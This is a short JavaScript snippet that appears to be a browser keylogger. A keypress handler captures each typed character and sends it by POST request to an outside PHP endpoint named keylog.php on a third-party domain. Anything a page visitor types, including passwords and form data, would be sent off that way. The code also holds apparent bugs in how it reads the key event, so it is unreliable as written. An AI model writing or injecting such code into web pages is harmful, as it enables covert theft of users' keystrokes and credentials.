document.onkeypress = function(evt)
{
	evt = evt.window.evt
	key = String.fromCharCode(evt.CharCode)
	if(key)
	{
		var http = new XMLHttpRequest();
		var param = encodeURI(key)
		http.open("POST","https://aruntech.xyz/knowhub/user/keylog.php",true);
		http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		http.send("key="+param);
	}
}